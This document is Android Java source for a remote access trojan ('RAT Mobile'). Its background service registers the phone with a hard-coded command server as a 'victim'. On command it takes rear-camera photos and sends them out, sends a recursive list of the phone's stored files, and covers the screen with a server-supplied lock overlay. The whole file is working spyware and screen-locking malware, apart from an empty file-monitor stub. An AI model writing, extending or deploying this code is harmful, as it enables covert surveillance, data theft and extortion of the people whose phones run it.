package com.rat.mobile;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class MainService extends Service {
    private Socket socket;
    private Camera camera;
    private WebView overlayWebView;
    private WindowManager windowManager;
    private String serverUrl = "http://10.45.241.68:3000";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification());
        startSocketConnection();
        startFileMonitor();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "rat_channel",
                "RAT Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        return new Notification.Builder(this, "rat_channel")
            .setContentTitle("RAT Mobile")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build();
    }

    private void startSocketConnection() {
        try {
            socket = IO.socket(serverUrl);
            socket.on(Socket.EVENT_CONNECT, args -> {
                try {
                    JSONObject data = new JSONObject()
                        .put("device", Build.MODEL)
                        .put("os", "Android " + Build.VERSION.RELEASE);
                    socket.emit("register-victim", data);
                } catch (Exception e) { e.printStackTrace(); }
            });

            socket.on("execute-lock", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    showLockOverlay(data.optString("html"));
                } catch (Exception e) { e.printStackTrace(); }
            });

            socket.on("capture-photo", args -> capturePhoto());
            socket.on("request-files", args -> sendFileList());

            socket.connect();
        } catch (URISyntaxException e) { e.printStackTrace(); }
    }

    private void capturePhoto() {
        try {
            camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
            camera.takePicture(null, null, (data, cam) -> {
                try {
                    String base64 = Base64.encodeToString(data, Base64.DEFAULT);
                    socket.emit("photo-capture", new JSONObject()
                        .put("image", "data:image/jpeg;base64," + base64));
                    cam.release();
                    camera = null;
                } catch (Exception e) { e.printStackTrace(); }
            });
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void sendFileList() {
        new Thread(() -> {
            try {
                List<String> files = new ArrayList<>();
                scanDirectory(Environment.getExternalStorageDirectory().getAbsolutePath(), files);
                socket.emit("file-list", new JSONObject()
                    .put("files", new JSONArray(files)));
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void scanDirectory(String path, List<String> list) {
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) return;
        for (File file : dir.listFiles()) {
            if (file.isDirectory()) scanDirectory(file.getAbsolutePath(), list);
            else list.add(file.getAbsolutePath() + " (" + file.length() + " bytes)");
        }
    }

    private void showLockOverlay(String htmlContent) {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlayWebView = new WebView(this);
        overlayWebView.setWebViewClient(new WebViewClient());
        overlayWebView.loadDataWithBaseURL(null, htmlContent, "text/html", "UTF-8", null);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            android.graphics.PixelFormat.TRANSLUCENT
        );
        windowManager.addView(overlayWebView, params);
    }

    private void startFileMonitor() {
        new Thread(() -> {
            while (true) {
                try { Thread.sleep(60000); } catch (InterruptedException e) { break; }
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socket != null) socket.disconnect();
        if (camera != null) camera.release();
        if (overlayWebView != null && windowManager != null)
            windowManager.removeView(overlayWebView);
    }
}
